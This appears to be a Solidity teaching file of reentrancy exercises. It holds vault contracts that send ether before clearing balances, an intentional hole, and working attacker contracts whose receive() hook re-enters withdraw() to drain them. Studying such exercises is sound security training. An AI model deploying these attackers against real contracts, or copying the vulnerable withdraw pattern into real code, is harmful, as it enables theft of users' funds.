// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Re-enter withdraw() until vault is drained.
A2: Adapt exploit to withdraw(uint256 amount).
*/
contract ExerciseA_ReentrancyVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing");

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
    }
}

interface IExerciseAReentrancyVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ExerciseA_ReentrancyExploitTemplate {
    IExerciseAReentrancyVault public target;

    function attack(IExerciseAReentrancyVault vault) external payable {
        target = vault;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}

/*
Exercise Type B (write fix):
Vulnerable vault + working attacker provided. Patch vault only.
*/
contract ExerciseB_VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing");

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
    }
}

contract ExerciseB_WorkingAttacker {
    ExerciseB_VulnerableVault public target;

    function attack(ExerciseB_VulnerableVault vault) external payable {
        target = vault;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
